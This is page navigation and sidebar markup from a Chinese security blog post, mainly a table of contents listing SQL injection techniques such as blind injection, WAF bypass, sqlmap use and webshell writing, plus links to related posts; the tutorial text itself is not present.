}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/web/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web<span class="tagsPageCount">7</span></a><a class="post-meta__box__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>后端漏洞<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">博客搭建</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">LDAP注入</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/" title="LDAP注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">LDAP注入</div></div></a></div><div><a href="/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">php反序列化</div></div></a></div><div><a href="/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">pickle反序列化</div></div></a></div><div><a href="/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="远程命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">远程命令执行</div></div></a></div><div><a href="/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="MD5长度拓展攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">MD5长度拓展攻击</div></div></a></div><div><a href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">反弹shell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-number">1.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">SQL注入基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E7%B1%BB"><span class="toc-number">2.0.1.</span> <span class="toc-text">简单分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8C%89%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">1.按数据类型分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8C%89%E7%85%A7%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">2.按照数据提交的方式来分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%E6%9D%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">3.按照执行效果来分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">4.其他类型注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.2.</span> <span class="toc-text">联合攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.3.</span> <span class="toc-text">堆叠攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.4.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.0.6.0.0.1.</span> <span class="toc-text">其他用到的函数：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E7%94%A8%E5%AF%86%E7%A0%81"><span class="toc-number">2.0.7.</span> <span class="toc-text">万用密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.0.7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%87%E7%94%A8%E5%AF%86%E7%A0%81"><span class="toc-number">2.0.7.2.</span> <span class="toc-text">常用万用密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95Bypass-%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.8.</span> <span class="toc-text">简单Bypass 绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">报错函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Updatexml"><span class="toc-number">3.1.1.</span> <span class="toc-text">Updatexml()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">3.1.2.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.3.</span> <span class="toc-text">其他注入函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%87%E8%83%BD%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.1.3.3.</span> <span class="toc-text">各种报错注入的万能语句</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE-1"><span class="toc-number">4.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">注入条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">理解与使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">偏移量注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE-2"><span class="toc-number">5.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-1"><span class="toc-number">5.3.</span> <span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE-3"><span class="toc-number">6.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-2"><span class="toc-number">6.2.</span> <span class="toc-text">使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">6.3.</span> <span class="toc-text">限制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3"><span class="toc-number">7.1.</span> <span class="toc-text">理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-3"><span class="toc-number">7.2.</span> <span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlong%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">DNSlong注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE-4"><span class="toc-number">8.1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-number">8.1.1.</span> <span class="toc-text">定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">8.1.2.</span> <span class="toc-text">使用场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%EF%BC%9A"><span class="toc-number">8.1.3.</span> <span class="toc-text">拓展：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">8.1.4.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.1.5.</span> <span class="toc-text">使用条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-4"><span class="toc-number">8.2.</span> <span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="toc-number">8.2.1.</span> <span class="toc-text">sql盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88xss"><span class="toc-number">8.2.2.</span> <span class="toc-text">配合xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88SSRF"><span class="toc-number">8.2.3.</span> <span class="toc-text">配合SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88XXE"><span class="toc-number">8.2.4.</span> <span class="toc-text">配合XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">8.2.5.</span> <span class="toc-text">配合命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB-%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">MongoDB 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A%E6%97%B6%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">9.2.</span> <span class="toc-text">1.数组绑定时的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%97%B6%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">9.3.</span> <span class="toc-text">2.拼接字符串时的注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">其他注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">10.1.</span> <span class="toc-text">中转注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-number">10.2.</span> <span class="toc-text">伪静态注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#json%E6%B3%A8%E5%85%A5"><span class="toc-number">10.3.</span> <span class="toc-text">json注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-number">10.3.1.</span> <span class="toc-text">1.简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81JSON%E7%BB%93%E6%9E%84"><span class="toc-number">10.3.2.</span> <span class="toc-text">2、JSON结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-JSON%E6%B3%A8%E5%85%A5"><span class="toc-number">10.3.3.</span> <span class="toc-text">3.JSON注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D-JSON-%E6%B3%A8%E5%85%A5"><span class="toc-number">10.3.4.</span> <span class="toc-text">4.如何避免 JSON 注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMAP%E4%BD%BF%E7%94%A8"><span class="toc-number">11.</span> <span class="toc-text">SQLMAP使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">11.1.</span> <span class="toc-text">参数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">11.2.</span> <span class="toc-text">常用指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95WAF"><span class="toc-number">11.3.</span> <span class="toc-text">绕WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">11.3.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4"><span class="toc-number">11.3.2.</span> <span class="toc-text">指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-risk"><span class="toc-number">11.3.3.</span> <span class="toc-text">-level&#x2F;-risk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%8C%87%E5%AE%9A%E7%9A%84SQL%E8%AF%AD%E5%8F%A5"><span class="toc-number">11.3.4.</span> <span class="toc-text">执行指定的SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8COS%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">11.3.5.</span> <span class="toc-text">执行OS系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6"><span class="toc-number">11.3.6.</span> <span class="toc-text">读取服务器文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E5%86%99%E9%A9%AC"><span class="toc-number">12.</span> <span class="toc-text">SQL写马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#into-outfile"><span class="toc-number">12.1.</span> <span class="toc-text">into outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">12.1.1.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%AD%A4%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E7%9A%84%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">12.1.1.1.</span> <span class="toc-text">1.此方法利用的先决条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-secure-file-priv"><span class="toc-number">12.1.1.2.</span> <span class="toc-text">2.secure_file_priv</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">12.1.2.</span> <span class="toc-text">写入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-number">12.1.2.1.</span> <span class="toc-text">1.注入点判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">12.1.2.2.</span> <span class="toc-text">2.判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%86%99%E5%85%A5webshell"><span class="toc-number">12.1.2.3.</span> <span class="toc-text">3.写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%BF%9E%E6%8E%A5webshell"><span class="toc-number">12.1.2.4.</span> <span class="toc-text">4.连接webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93os-shell"><span class="toc-number">12.2.</span> <span class="toc-text">–os-shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">12.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-5"><span class="toc-number">12.2.2.</span> <span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BEweb%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">12.3.</span> <span class="toc-text">如何寻找web文件路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mysql%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">12.3.1.</span> <span class="toc-text">利用mysql的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93sql-shell"><span class="toc-number">12.3.2.</span> <span class="toc-text">–sql-shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="toc-number">12.3.3.</span> <span class="toc-text">其他方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">12.4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E9%A9%AC"><span class="toc-number">12.5.</span> <span class="toc-text">日志马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97%E5%86%99%E9%A9%AC"><span class="toc-number">12.5.1.</span> <span class="toc-text">全局日志写马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%85%A2%E6%97%A5%E5%BF%97%E5%86%99%E9%A9%AC"><span class="toc-number">12.5.2.</span> <span class="toc-text">慢日志写马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">13.</span> <span class="toc-text">其他数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#access%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">13.1.</span> <span class="toc-text">access数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">13.2.</span> <span class="toc-text">mssql数据库</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a><time datetime="2024-05-15T11:45:09.000Z" title="发表于 2024-05-15 19:45:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp">2023-蓝桥杯-wp</a><time datetime="2024-05-15T02:39:09.000Z" title="发表于 2024-05-15 10:39:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp">2023-第一届“帕鲁杯”CTF-wp</a><time datetime="2024-05-15T02:36:58.000Z" title="发表于 2024-05-15 10:36:58">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp">2023-XYCTF-wp</a><time datetime="2024-05-15T02:31:24.000Z" title="发表于 2024-05-15 10:31:24">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp">2023-NKCTF-wp</a><time datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div 